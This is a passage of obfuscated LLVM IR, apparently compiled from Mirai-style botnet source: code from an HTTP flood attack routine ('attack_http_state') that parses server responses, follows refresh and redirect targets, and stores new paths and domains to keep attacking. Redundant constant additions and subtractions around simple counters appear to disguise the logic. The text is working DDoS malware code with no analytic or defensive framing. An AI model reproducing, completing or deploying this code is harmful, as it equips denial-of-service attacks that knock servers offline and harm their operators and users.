  %1826 = sub nsw i32 %1821, %1822
  %1827 = sext i32 %1825 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1816, i8* %1820, i64 %1827, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1828

; <label>:1828:                                   ; preds = %1849, %1815
  %1829 = load i8*, i8** %54, align 8
  %1830 = load i32, i32* %10, align 4
  %1831 = sext i32 %1830 to i64
  %1832 = getelementptr inbounds i8, i8* %1829, i64 %1831
  %1833 = load i8, i8* %1832, align 1
  %1834 = sext i8 %1833 to i32
  %1835 = icmp ne i32 %1834, 0
  br i1 %1835, label %1836, label %1854

; <label>:1836:                                   ; preds = %1828
  %1837 = load i8*, i8** %54, align 8
  %1838 = load i32, i32* %10, align 4
  %1839 = sext i32 %1838 to i64
  %1840 = getelementptr inbounds i8, i8* %1837, i64 %1839
  %1841 = load i8, i8* %1840, align 1
  %1842 = sext i8 %1841 to i32
  %1843 = icmp eq i32 %1842, 47
  br i1 %1843, label %1844, label %1849

; <label>:1844:                                   ; preds = %1836
  %1845 = load i8*, i8** %54, align 8
  %1846 = load i32, i32* %10, align 4
  %1847 = sext i32 %1846 to i64
  %1848 = getelementptr inbounds i8, i8* %1845, i64 %1847
  store i8 0, i8* %1848, align 1
  br label %1854

; <label>:1849:                                   ; preds = %1836
  %1850 = load i32, i32* %10, align 4
  %1851 = sub i32 0, 1
  %1852 = sub i32 %1850, %1851
  %1853 = add nsw i32 %1850, 1
  store i32 %1852, i32* %10, align 4
  br label %1828

; <label>:1854:                                   ; preds = %1844, %1828
  %1855 = load i8*, i8** %54, align 8
  %1856 = call i32 @util_strlen(i8* %1855)
  %1857 = icmp sgt i32 %1856, 0
  br i1 %1857, label %1858, label %1868

; <label>:1858:                                   ; preds = %1854
  %1859 = load i8*, i8** %54, align 8
  %1860 = call i32 @util_strlen(i8* %1859)
  %1861 = icmp slt i32 %1860, 128
  br i1 %1861, label %1862, label %1868

; <label>:1862:                                   ; preds = %1858
  %1863 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1864 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1863, i32 0, i32 7
  %1865 = getelementptr inbounds [129 x i8], [129 x i8]* %1864, i32 0, i32 0
  %1866 = load i8*, i8** %54, align 8
  %1867 = call i32 @util_strcpy(i8* %1865, i8* %1866)
  br label %1868

; <label>:1868:                                   ; preds = %1862, %1858, %1854
  %1869 = load i8*, i8** %54, align 8
  %1870 = load i32, i32* %10, align 4
  %1871 = sub i32 0, 1
  %1872 = sub i32 %1870, %1871
  %1873 = add nsw i32 %1870, 1
  %1874 = sext i32 %1872 to i64
  %1875 = getelementptr inbounds i8, i8* %1869, i64 %1874
  %1876 = call i32 @util_strlen(i8* %1875)
  %1877 = icmp slt i32 %1876, 256
  br i1 %1877, label %1878, label %1909

; <label>:1878:                                   ; preds = %1868
  %1879 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1880 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1879, i32 0, i32 6
  %1881 = getelementptr inbounds [257 x i8], [257 x i8]* %1880, i32 0, i32 0
  %1882 = getelementptr inbounds i8, i8* %1881, i64 1
  call void @util_zero(i8* %1882, i32 255)
  %1883 = load i8*, i8** %54, align 8
  %1884 = load i32, i32* %10, align 4
  %1885 = add i32 %1884, -171447074
  %1886 = add i32 %1885, 1
  %1887 = sub i32 %1886, -171447074
  %1888 = add nsw i32 %1884, 1
  %1889 = sext i32 %1887 to i64
  %1890 = getelementptr inbounds i8, i8* %1883, i64 %1889
  %1891 = call i32 @util_strlen(i8* %1890)
  %1892 = icmp sgt i32 %1891, 0
  br i1 %1892, label %1893, label %1908

; <label>:1893:                                   ; preds = %1878
  %1894 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1895 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1894, i32 0, i32 6
  %1896 = getelementptr inbounds [257 x i8], [257 x i8]* %1895, i32 0, i32 0
  %1897 = getelementptr inbounds i8, i8* %1896, i64 1
  %1898 = load i8*, i8** %54, align 8
  %1899 = load i32, i32* %10, align 4
  %1900 = sub i32 0, %1899
  %1901 = sub i32 0, 1
  %1902 = add i32 %1900, %1901
  %1903 = sub i32 0, %1902
  %1904 = add nsw i32 %1899, 1
  %1905 = sext i32 %1903 to i64
  %1906 = getelementptr inbounds i8, i8* %1898, i64 %1905
  %1907 = call i32 @util_strcpy(i8* %1897, i8* %1906)
  br label %1908

; <label>:1908:                                   ; preds = %1893, %1878
  br label %1909

; <label>:1909:                                   ; preds = %1908, %1868
  br label %1959

; <label>:1910:                                   ; preds = %1786
  %1911 = load i8*, i8** %54, align 8
  %1912 = getelementptr inbounds i8, i8* %1911, i64 0
  %1913 = load i8, i8* %1912, align 1
  %1914 = sext i8 %1913 to i32
  %1915 = icmp eq i32 %1914, 47
  br i1 %1915, label %1916, label %1958

; <label>:1916:                                   ; preds = %1910
  %1917 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1918 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1917, i32 0, i32 6
  %1919 = getelementptr inbounds [257 x i8], [257 x i8]* %1918, i32 0, i32 0
  %1920 = getelementptr inbounds i8, i8* %1919, i64 1
  call void @util_zero(i8* %1920, i32 255)
  %1921 = load i8*, i8** %54, align 8
  %1922 = load i32, i32* %10, align 4
  %1923 = sub i32 %1922, -83010396
  %1924 = add i32 %1923, 1
  %1925 = add i32 %1924, -83010396
  %1926 = add nsw i32 %1922, 1
  %1927 = sext i32 %1925 to i64
  %1928 = getelementptr inbounds i8, i8* %1921, i64 %1927
  %1929 = call i32 @util_strlen(i8* %1928)
  %1930 = icmp sgt i32 %1929, 0
  br i1 %1930, label %1931, label %1957

; <label>:1931:                                   ; preds = %1916
  %1932 = load i8*, i8** %54, align 8
  %1933 = load i32, i32* %10, align 4
  %1934 = sub i32 0, %1933
  %1935 = sub i32 0, 1
  %1936 = add i32 %1934, %1935
  %1937 = sub i32 0, %1936
  %1938 = add nsw i32 %1933, 1
  %1939 = sext i32 %1937 to i64
  %1940 = getelementptr inbounds i8, i8* %1932, i64 %1939
  %1941 = call i32 @util_strlen(i8* %1940)
  %1942 = icmp slt i32 %1941, 256
  br i1 %1942, label %1943, label %1957

; <label>:1943:                                   ; preds = %1931
  %1944 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1945 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1944, i32 0, i32 6
  %1946 = getelementptr inbounds [257 x i8], [257 x i8]* %1945, i32 0, i32 0
  %1947 = getelementptr inbounds i8, i8* %1946, i64 1
  %1948 = load i8*, i8** %54, align 8
  %1949 = load i32, i32* %10, align 4
  %1950 = sub i32 %1949, 1392201766
  %1951 = add i32 %1950, 1
  %1952 = add i32 %1951, 1392201766
  %1953 = add nsw i32 %1949, 1
  %1954 = sext i32 %1952 to i64
  %1955 = getelementptr inbounds i8, i8* %1948, i64 %1954
  %1956 = call i32 @util_strcpy(i8* %1947, i8* %1955)
  br label %1957

; <label>:1957:                                   ; preds = %1943, %1931, %1916
  br label %1958

; <label>:1958:                                   ; preds = %1957, %1910
  br label %1959

; <label>:1959:                                   ; preds = %1958, %1909
  %1960 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1961 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1960, i32 0, i32 1
  store i8 1, i8* %1961, align 4
  br label %2888

; <label>:1962:                                   ; preds = %1760
  br label %1963

; <label>:1963:                                   ; preds = %1962, %1738
  %1964 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1965 = load i32, i32* %12, align 4
  %1966 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1967 = call i32 @util_stristr(i8* %1964, i32 %1965, i8* %1966)
  %1968 = icmp ne i32 %1967, -1
  br i1 %1968, label %1969, label %2364

; <label>:1969:                                   ; preds = %1963
  %1970 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1971 = load i32, i32* %12, align 4
  %1972 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1973 = call i32 @util_stristr(i8* %1970, i32 %1971, i8* %1972)
  store i32 %1973, i32* %55, align 4
  %1974 = load i32, i32* %55, align 4
  %1975 = sext i32 %1974 to i64
  %1976 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1975
  %1977 = load i8, i8* %1976, align 1
  %1978 = sext i8 %1977 to i32
  %1979 = icmp eq i32 %1978, 32
  br i1 %1979, label %1980, label %1985

; <label>:1980:                                   ; preds = %1969
  %1981 = load i32, i32* %55, align 4
  %1982 = sub i32 0, 1
  %1983 = sub i32 %1981, %1982
  %1984 = add nsw i32 %1981, 1
  store i32 %1983, i32* %55, align 4
  br label %1985

; <label>:1985:                                   ; preds = %1980, %1969
  %1986 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1987 = load i32, i32* %55, align 4
  %1988 = sext i32 %1987 to i64
  %1989 = getelementptr inbounds i8, i8* %1986, i64 %1988
  %1990 = load i32, i32* %12, align 4
  %1991 = load i32, i32* %55, align 4
  %1992 = sub i32 0, %1991
  %1993 = add i32 %1990, %1992
  %1994 = sub nsw i32 %1990, %1991
  %1995 = call i32 @util_memsearch(i8* %1989, i32 %1993, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1995, i32* %56, align 4
  %1996 = load i32, i32* %56, align 4
  %1997 = icmp ne i32 %1996, -1
  br i1 %1997, label %1998, label %2363

; <label>:1998:                                   ; preds = %1985
  %1999 = load i32, i32* %55, align 4
  %2000 = sext i32 %1999 to i64
  %2001 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2000
  store i8* %2001, i8** %57, align 8
  %2002 = load i32, i32* %56, align 4
  %2003 = icmp sge i32 %2002, 2
  br i1 %2003, label %2004, label %2010

; <label>:2004:                                   ; preds = %1998
  %2005 = load i32, i32* %56, align 4
  %2006 = sub i32 %2005, -567960125
  %2007 = sub i32 %2006, 2
  %2008 = add i32 %2007, -567960125
  %2009 = sub nsw i32 %2005, 2
  store i32 %2008, i32* %56, align 4
  br label %2010

; <label>:2010:                                   ; preds = %2004, %1998
  %2011 = load i32, i32* %55, align 4
  %2012 = load i32, i32* %56, align 4
  %2013 = add i32 %2011, 1811351860
  %2014 = add i32 %2013, %2012
  %2015 = sub i32 %2014, 1811351860
  %2016 = add nsw i32 %2011, %2012
  %2017 = sext i32 %2015 to i64
  %2018 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2017
  store i8 0, i8* %2018, align 1
  %2019 = load i32, i32* %56, align 4
  %2020 = sub i32 0, %2019
  %2021 = sub i32 0, 1
  %2022 = add i32 %2020, %2021
  %2023 = sub i32 0, %2022
  %2024 = add nsw i32 %2019, 1
  store i32 %2023, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %2025

; <label>:2025:                                   ; preds = %2051, %2010
  %2026 = load i8*, i8** %57, align 8
  %2027 = load i32, i32* %10, align 4
  %2028 = sext i32 %2027 to i64
  %2029 = getelementptr inbounds i8, i8* %2026, i64 %2028
  %2030 = load i8, i8* %2029, align 1
  %2031 = sext i8 %2030 to i32
  %2032 = icmp ne i32 %2031, 0
  br i1 %2032, label %2033, label %2049

; <label>:2033:                                   ; preds = %2025
  %2034 = load i8*, i8** %57, align 8
  %2035 = load i32, i32* %10, align 4
  %2036 = sext i32 %2035 to i64
  %2037 = getelementptr inbounds i8, i8* %2034, i64 %2036
  %2038 = load i8, i8* %2037, align 1
  %2039 = sext i8 %2038 to i32
  %2040 = icmp sge i32 %2039, 48
  br i1 %2040, label %2041, label %2049

; <label>:2041:                                   ; preds = %2033
  %2042 = load i8*, i8** %57, align 8
  %2043 = load i32, i32* %10, align 4
  %2044 = sext i32 %2043 to i64
  %2045 = getelementptr inbounds i8, i8* %2042, i64 %2044
  %2046 = load i8, i8* %2045, align 1
  %2047 = sext i8 %2046 to i32
  %2048 = icmp sle i32 %2047, 57
  br label %2049

; <label>:2049:                                   ; preds = %2041, %2033, %2025
  %2050 = phi i1 [ false, %2033 ], [ false, %2025 ], [ %2048, %2041 ]
  br i1 %2050, label %2051, label %2058

; <label>:2051:                                   ; preds = %2049
  %2052 = load i32, i32* %10, align 4
  %2053 = sub i32 0, %2052
  %2054 = sub i32 0, 1
  %2055 = add i32 %2053, %2054
  %2056 = sub i32 0, %2055
  %2057 = add nsw i32 %2052, 1
  store i32 %2056, i32* %10, align 4
  br label %2025

; <label>:2058:                                   ; preds = %2049
  %2059 = load i8*, i8** %57, align 8
  %2060 = load i32, i32* %10, align 4
  %2061 = sext i32 %2060 to i64
  %2062 = getelementptr inbounds i8, i8* %2059, i64 %2061
  %2063 = load i8, i8* %2062, align 1
  %2064 = sext i8 %2063 to i32
  %2065 = icmp ne i32 %2064, 0
  br i1 %2065, label %2066, label %2362

; <label>:2066:                                   ; preds = %2058
  store i32 0, i32* %58, align 4
  %2067 = load i8*, i8** %57, align 8
  %2068 = load i32, i32* %10, align 4
  %2069 = sext i32 %2068 to i64
  %2070 = getelementptr inbounds i8, i8* %2067, i64 %2069
  store i8 0, i8* %2070, align 1
  %2071 = load i32, i32* %10, align 4
  %2072 = sub i32 %2071, 1267105896
  %2073 = add i32 %2072, 1
  %2074 = add i32 %2073, 1267105896
  %2075 = add nsw i32 %2071, 1
  store i32 %2074, i32* %10, align 4
  %2076 = load i8*, i8** %57, align 8
  %2077 = load i32, i32* %10, align 4
  %2078 = sext i32 %2077 to i64
  %2079 = getelementptr inbounds i8, i8* %2076, i64 %2078
  %2080 = load i8, i8* %2079, align 1
  %2081 = sext i8 %2080 to i32
  %2082 = icmp eq i32 %2081, 32
  br i1 %2082, label %2083, label %2090

; <label>:2083:                                   ; preds = %2066
  %2084 = load i32, i32* %10, align 4
  %2085 = sub i32 0, %2084
  %2086 = sub i32 0, 1
  %2087 = add i32 %2085, %2086
  %2088 = sub i32 0, %2087
  %2089 = add nsw i32 %2084, 1
  store i32 %2088, i32* %10, align 4
  br label %2090

; <label>:2090:                                   ; preds = %2083, %2066
  %2091 = load i8*, i8** %57, align 8
  %2092 = load i32, i32* %10, align 4
  %2093 = sext i32 %2092 to i64
  %2094 = getelementptr inbounds i8, i8* %2091, i64 %2093
  %2095 = load i8*, i8** %57, align 8
  %2096 = load i32, i32* %10, align 4
  %2097 = sext i32 %2096 to i64
  %2098 = getelementptr inbounds i8, i8* %2095, i64 %2097
  %2099 = call i32 @util_strlen(i8* %2098)
  %2100 = call i32 @util_stristr(i8* %2094, i32 %2099, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2101 = icmp ne i32 %2100, -1
  br i1 %2101, label %2102, label %2117

; <label>:2102:                                   ; preds = %2090
  %2103 = load i8*, i8** %57, align 8
  %2104 = load i32, i32* %10, align 4
  %2105 = sext i32 %2104 to i64
  %2106 = getelementptr inbounds i8, i8* %2103, i64 %2105
  %2107 = load i8*, i8** %57, align 8
  %2108 = load i32, i32* %10, align 4
  %2109 = sext i32 %2108 to i64
  %2110 = getelementptr inbounds i8, i8* %2107, i64 %2109
  %2111 = call i32 @util_strlen(i8* %2110)
  %2112 = call i32 @util_stristr(i8* %2106, i32 %2111, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2113 = load i32, i32* %10, align 4
  %2114 = sub i32 0, %2112
  %2115 = sub i32 %2113, %2114
  %2116 = add nsw i32 %2113, %2112
  store i32 %2115, i32* %10, align 4
  br label %2117

; <label>:2117:                                   ; preds = %2102, %2090
  %2118 = load i8*, i8** %57, align 8
  %2119 = load i32, i32* %10, align 4
  %2120 = sext i32 %2119 to i64
  %2121 = getelementptr inbounds i8, i8* %2118, i64 %2120
  %2122 = load i8, i8* %2121, align 1
  %2123 = sext i8 %2122 to i32
  %2124 = icmp eq i32 %2123, 34
  br i1 %2124, label %2125, label %2165

; <label>:2125:                                   ; preds = %2117
  %2126 = load i32, i32* %10, align 4
  %2127 = add i32 %2126, -1745475649
  %2128 = add i32 %2127, 1
  %2129 = sub i32 %2128, -1745475649
  %2130 = add nsw i32 %2126, 1
  store i32 %2129, i32* %10, align 4
  %2131 = load i8*, i8** %57, align 8
  %2132 = load i32, i32* %10, align 4
  %2133 = sext i32 %2132 to i64
  %2134 = getelementptr inbounds i8, i8* %2131, i64 %2133
  %2135 = load i8*, i8** %57, align 8
  %2136 = load i32, i32* %10, align 4
  %2137 = sext i32 %2136 to i64
  %2138 = getelementptr inbounds i8, i8* %2135, i64 %2137
  %2139 = call i32 @util_strlen(i8* %2138)
  %2140 = sub i32 0, 1
  %2141 = add i32 %2139, %2140
  %2142 = sub nsw i32 %2139, 1
  %2143 = sext i32 %2141 to i64
  %2144 = getelementptr inbounds i8, i8* %2134, i64 %2143
  %2145 = load i8, i8* %2144, align 1
  %2146 = sext i8 %2145 to i32
  %2147 = icmp eq i32 %2146, 34
  br i1 %2147, label %2148, label %2164

; <label>:2148:                                   ; preds = %2125
  %2149 = load i8*, i8** %57, align 8
  %2150 = load i32, i32* %10, align 4
  %2151 = sext i32 %2150 to i64
  %2152 = getelementptr inbounds i8, i8* %2149, i64 %2151
  %2153 = load i8*, i8** %57, align 8
  %2154 = load i32, i32* %10, align 4
  %2155 = sext i32 %2154 to i64
  %2156 = getelementptr inbounds i8, i8* %2153, i64 %2155
  %2157 = call i32 @util_strlen(i8* %2156)
  %2158 = add i32 %2157, -1169389927
  %2159 = sub i32 %2158, 1
  %2160 = sub i32 %2159, -1169389927
  %2161 = sub nsw i32 %2157, 1
  %2162 = sext i32 %2160 to i64
  %2163 = getelementptr inbounds i8, i8* %2152, i64 %2162
  store i8 0, i8* %2163, align 1
  br label %2164

; <label>:2164:                                   ; preds = %2148, %2125
  br label %2165

; <label>:2165:                                   ; preds = %2164, %2117
  %2166 = load i8*, i8** %57, align 8
  %2167 = call i32 @util_atoi(i8* %2166, i32 10)
  store i32 %2167, i32* %58, align 4
  br label %2168

; <label>:2168:                                   ; preds = %2186, %2165
  %2169 = load i32, i32* %58, align 4
  %2170 = icmp sgt i32 %2169, 0
  br i1 %2170, label %2171, label %2184

; <label>:2171:                                   ; preds = %2168
  %2172 = load i32, i32* %58, align 4
  %2173 = icmp slt i32 %2172, 10
  br i1 %2173, label %2174, label %2184

; <label>:2174:                                   ; preds = %2171
  %2175 = load i32, i32* %27, align 4
  %2176 = load i32, i32* %58, align 4
  %2177 = sub i32 %2175, 1075602163
  %2178 = add i32 %2177, %2176
  %2179 = add i32 %2178, 1075602163
  %2180 = add i32 %2175, %2176
  %2181 = zext i32 %2179 to i64
  %2182 = call i64 @time(i64* null) #6
  %2183 = icmp sgt i64 %2181, %2182
  br label %2184

; <label>:2184:                                   ; preds = %2174, %2171, %2168
  %2185 = phi i1 [ false, %2171 ], [ false, %2168 ], [ %2183, %2174 ]
  br i1 %2185, label %2186, label %2188

; <label>:2186:                                   ; preds = %2184
  %2187 = call i32 @sleep(i32 1)
  br label %2168

; <label>:2188:                                   ; preds = %2184
  %2189 = load i8*, i8** %57, align 8
  %2190 = load i32, i32* %10, align 4
  %2191 = sext i32 %2190 to i64
  %2192 = getelementptr inbounds i8, i8* %2189, i64 %2191
  store i8* %2192, i8** %57, align 8
  %2193 = load i8*, i8** %57, align 8
  %2194 = load i8*, i8** %57, align 8
  %2195 = call i32 @util_strlen(i8* %2194)
  %2196 = call i32 @util_stristr(i8* %2193, i32 %2195, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %2197 = icmp eq i32 %2196, 4
  br i1 %2197, label %2198, label %2305

; <label>:2198:                                   ; preds = %2188
  store i32 7, i32* %10, align 4
  %2199 = load i8*, i8** %57, align 8
  %2200 = getelementptr inbounds i8, i8* %2199, i64 4
  %2201 = load i8, i8* %2200, align 1
  %2202 = sext i8 %2201 to i32
  %2203 = icmp eq i32 %2202, 115
  br i1 %2203, label %2204, label %2209

; <label>:2204:                                   ; preds = %2198
  %2205 = load i32, i32* %10, align 4
  %2206 = sub i32 0, 1
  %2207 = sub i32 %2205, %2206
  %2208 = add nsw i32 %2205, 1
  store i32 %2207, i32* %10, align 4
  br label %2209

; <label>:2209:                                   ; preds = %2204, %2198
  %2210 = load i8*, i8** %57, align 8
  %2211 = load i8*, i8** %57, align 8
  %2212 = load i32, i32* %10, align 4
  %2213 = sext i32 %2212 to i64
  %2214 = getelementptr inbounds i8, i8* %2211, i64 %2213
  %2215 = load i32, i32* %56, align 4
  %2216 = load i32, i32* %10, align 4
  %2217 = sub i32 %2215, 239819645
  %2218 = sub i32 %2217, %2216
  %2219 = add i32 %2218, 239819645
  %2220 = sub nsw i32 %2215, %2216
  %2221 = sext i32 %2219 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2210, i8* %2214, i64 %2221, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2222

; <label>:2222:                                   ; preds = %2243, %2209
  %2223 = load i8*, i8** %57, align 8
  %2224 = load i32, i32* %10, align 4
  %2225 = sext i32 %2224 to i64
  %2226 = getelementptr inbounds i8, i8* %2223, i64 %2225
  %2227 = load i8, i8* %2226, align 1
  %2228 = sext i8 %2227 to i32
  %2229 = icmp ne i32 %2228, 0
  br i1 %2229, label %2230, label %2249

; <label>:2230:                                   ; preds = %2222
  %2231 = load i8*, i8** %57, align 8
  %2232 = load i32, i32* %10, align 4
  %2233 = sext i32 %2232 to i64
  %2234 = getelementptr inbounds i8, i8* %2231, i64 %2233
  %2235 = load i8, i8* %2234, align 1
  %2236 = sext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 47
  br i1 %2237, label %2238, label %2243

; <label>:2238:                                   ; preds = %2230
  %2239 = load i8*, i8** %57, align 8
  %2240 = load i32, i32* %10, align 4
  %2241 = sext i32 %2240 to i64
  %2242 = getelementptr inbounds i8, i8* %2239, i64 %2241
  store i8 0, i8* %2242, align 1
  br label %2249

; <label>:2243:                                   ; preds = %2230
  %2244 = load i32, i32* %10, align 4
  %2245 = add i32 %2244, -1089864472
  %2246 = add i32 %2245, 1
  %2247 = sub i32 %2246, -1089864472
  %2248 = add nsw i32 %2244, 1
  store i32 %2247, i32* %10, align 4
  br label %2222

; <label>:2249:                                   ; preds = %2238, %2222
  %2250 = load i8*, i8** %57, align 8
  %2251 = call i32 @util_strlen(i8* %2250)
  %2252 = icmp sgt i32 %2251, 0
  br i1 %2252, label %2253, label %2263

; <label>:2253:                                   ; preds = %2249
  %2254 = load i8*, i8** %57, align 8
  %2255 = call i32 @util_strlen(i8* %2254)
  %2256 = icmp slt i32 %2255, 128
  br i1 %2256, label %2257, label %2263

; <label>:2257:                                   ; preds = %2253
  %2258 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2259 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2258, i32 0, i32 7
  %2260 = getelementptr inbounds [129 x i8], [129 x i8]* %2259, i32 0, i32 0
  %2261 = load i8*, i8** %57, align 8
  %2262 = call i32 @util_strcpy(i8* %2260, i8* %2261)
  br label %2263

; <label>:2263:                                   ; preds = %2257, %2253, %2249
  %2264 = load i8*, i8** %57, align 8
  %2265 = load i32, i32* %10, align 4
  %2266 = add i32 %2265, -2025600281
  %2267 = add i32 %2266, 1
  %2268 = sub i32 %2267, -2025600281
  %2269 = add nsw i32 %2265, 1
  %2270 = sext i32 %2268 to i64
  %2271 = getelementptr inbounds i8, i8* %2264, i64 %2270
  %2272 = call i32 @util_strlen(i8* %2271)
  %2273 = icmp slt i32 %2272, 256
  br i1 %2273, label %2274, label %2304

; <label>:2274:                                   ; preds = %2263
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 6
  %2277 = getelementptr inbounds [257 x i8], [257 x i8]* %2276, i32 0, i32 0
  %2278 = getelementptr inbounds i8, i8* %2277, i64 1
  call void @util_zero(i8* %2278, i32 255)
  %2279 = load i8*, i8** %57, align 8
  %2280 = load i32, i32* %10, align 4
  %2281 = sub i32 %2280, 2006412740
  %2282 = add i32 %2281, 1
  %2283 = add i32 %2282, 2006412740
  %2284 = add nsw i32 %2280, 1
  %2285 = sext i32 %2283 to i64
  %2286 = getelementptr inbounds i8, i8* %2279, i64 %2285
  %2287 = call i32 @util_strlen(i8* %2286)
  %2288 = icmp sgt i32 %2287, 0
  br i1 %2288, label %2289, label %2303

; <label>:2289:                                   ; preds = %2274
  %2290 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2290, i32 0, i32 6
  %2292 = getelementptr inbounds [257 x i8], [257 x i8]* %2291, i32 0, i32 0
  %2293 = getelementptr inbounds i8, i8* %2292, i64 1
  %2294 = load i8*, i8** %57, align 8
  %2295 = load i32, i32* %10, align 4
  %2296 = sub i32 %2295, -550891121
  %2297 = add i32 %2296, 1
  %2298 = add i32 %2297, -550891121
  %2299 = add nsw i32 %2295, 1
  %2300 = sext i32 %2298 to i64
  %2301 = getelementptr inbounds i8, i8* %2294, i64 %2300
  %2302 = call i32 @util_strcpy(i8* %2293, i8* %2301)
  br label %2303

; <label>:2303:                                   ; preds = %2289, %2274
  br label %2304

; <label>:2304:                                   ; preds = %2303, %2263
  br label %2355

; <label>:2305:                                   ; preds = %2188
  %2306 = load i8*, i8** %57, align 8
  %2307 = getelementptr inbounds i8, i8* %2306, i64 0
  %2308 = load i8, i8* %2307, align 1
  %2309 = sext i8 %2308 to i32
  %2310 = icmp eq i32 %2309, 47
  br i1 %2310, label %2311, label %2354

; <label>:2311:                                   ; preds = %2305
  %2312 = load i8*, i8** %57, align 8
  %2313 = load i32, i32* %10, align 4
  %2314 = sub i32 0, %2313
  %2315 = sub i32 0, 1
  %2316 = add i32 %2314, %2315
  %2317 = sub i32 0, %2316
  %2318 = add nsw i32 %2313, 1
  %2319 = sext i32 %2317 to i64
  %2320 = getelementptr inbounds i8, i8* %2312, i64 %2319
  %2321 = call i32 @util_strlen(i8* %2320)
  %2322 = icmp slt i32 %2321, 256
  br i1 %2322, label %2323, label %2353

; <label>:2323:                                   ; preds = %2311
  %2324 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2324, i32 0, i32 6
  %2326 = getelementptr inbounds [257 x i8], [257 x i8]* %2325, i32 0, i32 0
  %2327 = getelementptr inbounds i8, i8* %2326, i64 1
  call void @util_zero(i8* %2327, i32 255)
  %2328 = load i8*, i8** %57, align 8
  %2329 = load i32, i32* %10, align 4
  %2330 = sub i32 %2329, 1528501588
  %2331 = add i32 %2330, 1
  %2332 = add i32 %2331, 1528501588
  %2333 = add nsw i32 %2329, 1
  %2334 = sext i32 %2332 to i64
  %2335 = getelementptr inbounds i8, i8* %2328, i64 %2334
  %2336 = call i32 @util_strlen(i8* %2335)
  %2337 = icmp sgt i32 %2336, 0
  br i1 %2337, label %2338, label %2352

; <label>:2338:                                   ; preds = %2323
  %2339 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2339, i32 0, i32 6
  %2341 = getelementptr inbounds [257 x i8], [257 x i8]* %2340, i32 0, i32 0
  %2342 = getelementptr inbounds i8, i8* %2341, i64 1
  %2343 = load i8*, i8** %57, align 8
  %2344 = load i32, i32* %10, align 4
  %2345 = sub i32 %2344, -236016337
  %2346 = add i32 %2345, 1
  %2347 = add i32 %2346, -236016337
  %2348 = add nsw i32 %2344, 1
  %2349 = sext i32 %2347 to i64
  %2350 = getelementptr inbounds i8, i8* %2343, i64 %2349
  %2351 = call i32 @util_strcpy(i8* %2342, i8* %2350)
  br label %2352

; <label>:2352:                                   ; preds = %2338, %2323
  br label %2353

; <label>:2353:                                   ; preds = %2352, %2311
  br label %2354

; <label>:2354:                                   ; preds = %2353, %2305
  br label %2355

; <label>:2355:                                   ; preds = %2354, %2304
  %2356 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2356, i32 0, i32 9
  %2358 = getelementptr inbounds [9 x i8], [9 x i8]* %2357, i32 0, i32 0
  %2359 = call i8* @strcpy(i8* %2358, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2360, i32 0, i32 1
  store i8 10, i8* %2361, align 4
  br label %2888

; <label>:2362:                                   ; preds = %2058
  br label %2363

; <label>:2363:                                   ; preds = %2362, %1985
  br label %2364

; <label>:2364:                                   ; preds = %2363, %1963
  %2365 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2366 = load i32, i32* %12, align 4
  %2367 = call i32 @util_memsearch(i8* %2365, i32 %2366, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2367, i32* %37, align 4
  %2368 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2368, i32 0, i32 9
  %2370 = getelementptr inbounds [9 x i8], [9 x i8]* %2369, i32 0, i32 0
